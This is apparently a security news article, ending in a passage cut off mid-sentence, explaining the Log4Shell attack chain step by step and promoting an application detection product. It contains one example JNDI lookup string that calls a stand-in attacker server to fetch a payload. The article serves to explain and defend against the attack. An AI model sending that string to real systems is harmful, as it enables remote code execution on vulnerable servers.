---
title: Anatomy of an Attack
url: https://thehackernews.com/2024/08/anatomy-of-attack.html
source: The Hacker News
date: 2024-08-21
fetch_date: 2025-10-06T18:08:47.821491
---

# Anatomy of an Attack

#1 Trusted Cybersecurity News Platform

Followed by 5.20+ million[**](https://twitter.com/thehackersnews)
[**](https://www.linkedin.com/company/thehackernews/)
[**](https://www.facebook.com/thehackernews)

[![The Hacker News Logo](data:image/png;base64...)](/)

**

**

[** Subscribe – Get Latest News](#email-outer)

* [** Home](/)
* [** Newsletter](#email-outer)
* [** Webinars](/p/upcoming-hacker-news-webinars.html)

* [Home](/)
* [Data Breaches](/search/label/data%20breach)
* [Cyber Attacks](/search/label/Cyber%20Attack)
* [Vulnerabilities](/search/label/Vulnerability)
* [Webinars](/p/upcoming-hacker-news-webinars.html)
* [Expert Insights](https://thehackernews.com/expert-insights/)
* [Contact](/p/submit-news.html)

**

**

**

Resources

* [Webinars](/p/upcoming-hacker-news-webinars.html)
* [Free eBooks](https://thehackernews.tradepub.com)

About Site

* [About THN](/p/about-us.html)
* [Jobs](/p/careers-technical-writer-designer-and.html)
* [Advertise with us](/p/advertising-with-hacker-news.html)

Contact/Tip Us

[**

Reach out to get featured—contact us to send your exclusive story idea, research, hacks, or ask us a question or leave a comment/feedback!](/p/submit-news.html)

Follow Us On Social Media

[**](https://www.facebook.com/thehackernews)
[**](https://twitter.com/thehackersnews)
[**](https://www.linkedin.com/company/thehackernews/)
[**](https://www.youtube.com/c/thehackernews?sub_confirmation=1)
[**](https://www.instagram.com/thehackernews/)

[** RSS Feeds](https://feeds.feedburner.com/TheHackersNews)
[** Email Alerts](#email-outer)

[![Salesforce Security Handbook](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjWa8tsMNqlevi1HGF1ALQRGIq7hROPFAbHd3R1RTEOe73T8_Q2xW_-91t2jSGjU5peiPb8QYblGp4igNW-u2Qmlxbp2BKzTVMSvyXDZJmC-BYpiiJHrcnG5drmSP97iZ9PVIf1DeEr7U-7vWpe4HXwfMjt8FGNgq5mOycOJluYr9wF7YOKrQY9MfArwgjt/s728-e100/ai-agent-security-d.png)](https://thehackernews.uk/ai-agent-security-d)

# [Anatomy of an Attack](https://thehackernews.com/2024/08/anatomy-of-attack.html)

**Aug 20, 2024**The Hacker NewsThreat Detection / Incident Response

[![](data:image/png;base64...)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgwxwUnXF9PSm01BZvI6qAW038AG_WEeIxbN-TE1xpwyJAW1ZMEevKiPE6QbzWzG9YK-jHrd_4btRPxuxXzt5Cy3bzlk2L7y0Qb3KAg4MYGmL3S_I7M5CwFy2X60oTdUAalNm5ZseypHMDh6KaLH06NBCcx7qPIwCKSyRjI138lXFRmoyadZb2RCK319-7u/s790-rw-e365/chipset_monster_728x380.jpg)

In today's rapidly evolving cyber threat landscape, organizations face increasingly sophisticated attacks targeting their applications. Understanding these threats and the technologies designed to combat them is crucial. This article delves into the mechanics of a common application attack, using the infamous Log4Shell vulnerability as an example, and demonstrates how Application Detection and Response (ADR) technology effectively safeguards against such zero-day threats.

***[View the Contrast ADR white paper](https://www.contrastsecurity.com/whitepaper/the-case-for-application-detection-and-response-adr)***

## The anatomy of a modern application attack: Log4Shell

To illustrate the complexity and severity of modern application attacks, let's examine an attack against the infamous Log4Shell vulnerability ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)) that sent shockwaves through the cybersecurity world in late 2021. This attack is a prime example of attack chaining, leveraging JNDI Injection, Expression Language (EL) Injection and Command Injection.

***Technology note****: The CVE program catalogs, which publicly disclose computer security flaws, are maintained by [MITRE](https://cve.mitre.org/). Each CVE entry has a unique identifier, making it easier for IT professionals to share information about vulnerabilities across different security tools and services.*

[![](data:image/png;base64...)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj1-k_mzJSkOTWCUEfmFNa542JwZmWjni3XBrlR88KlAK_n26buNcEgMoLoR0QMb1piBr3_8sXEGO739WVlbdu2hOAj0pgoFkW3pGZTfYJf2Ku7g6kkN9dOHbV4Smy4CBxyOkc8EFb5t1nc2GRQ5zoeNCs2I7ZHVffRbhD3Z6Gxf0lQeyf_HKoyTw-44fA/s790-rw-e365/1.jpg)

### Step 1: Exploitation of the vulnerability

The Log4Shell vulnerability affects Log4j, a ubiquitous Java logging framework. The attack begins when a malicious actor sends a specially crafted request to a vulnerable application. This request contains a Java Naming and Directory Interface (JNDI) lookup string in a format like this:

${jndi:ldap://attacker-controlled-server.com/payload}

***Technology note:*** *[JNDI (Java Naming and Directory Interface)](https://docs.oracle.com/javase/tutorial/jndi/overview/index.html) is a Java API that provides naming and directory functionality to Java applications. It allows Java applications to discover and look up data and objects via a name, which can be exploited in certain vulnerabilities like Log4Shell. In this context, it's being abused to initiate a connection to a malicious server.*

### Step 2: JNDI lookup and EL evaluation

When the vulnerable Log4j version processes this string, it interprets the JNDI expression part as an expression to be evaluated. This evaluation causes the application to perform a JNDI lookup, reaching out to the attacker-controlled Lightweight Directory Access Protocol (LDAP) server specified in the string.

***Technology note****: [Log4j](https://logging.apache.org/log4j/2.x/) is a popular Java-based logging framework developed by Apache. It's widely used in Java applications for logging various types of data and events.*

### Step 3: Malicious payload retrieval

The attacker's LDAP server responds with an EL injection payload. Due to the nature of JNDI and how Log4j processes the response, this payload is treated as an EL expression to be evaluated.

### Step 4: EL injection

The EL expression typically contains malicious code designed to exploit the EL interpreter. This could include commands to download and execute additional malware, exfiltrate data, or establish a backdoor in the system.

***Technology note:*** *[Expression Language (EL)](https://docs.oracle.com/javaee/6/tutorial/doc/gjddd.html) is a scripting language that allows access to application data. EL injection occurs when an attacker can manipulate or inject malicious EL expressions, potentially leading to code execution. EL injection vulnerabilities are a recurring theme among zero-day vulnerabilities, either directly or indirectly through chained attacks as in this example.*

### Step 5: Code execution

As the EL interpreter evaluates the injected expression, it executes the malicious code within the context of the vulnerable application. This gives the attacker a foothold into the system, often with the same privileges as the application itself.

### The power and danger of Log4Shell

What makes the Log4Shell vulnerability particularly severe is the widespread use of the Log4j library and how easy it was to exploit the vulnerability. It carries the following concerns:

1. **Wide attack surface**: Log4j is used in many Java applications and frameworks, making this type of vulnerability widespread.
2. **Remote code execution**: The associated JNDI injection can lead directly to remote code execution (RCE), giving attackers significant control over the vulnerable system.
3. **Difficult to detect**: Attacks against the Log4Shell vulnerability can be obfuscated, making them hard to detect through simple pattern matching of network-level protections.
4. **Chained attacks**: The JNDI injection attack can be chained with other techniques, such as EL injection and Command Injection, to create more complex attacks.

This anatomy of the Log4Shell attack demonstrates why application layer attacks are so potent and why protection mechanisms like Application Detection and Response (ADR) — explained below in depth — are crucial for detecting and preventing such sophisticated attacks.

***[See how to eliminate your application blindspot with Contrast ADR ...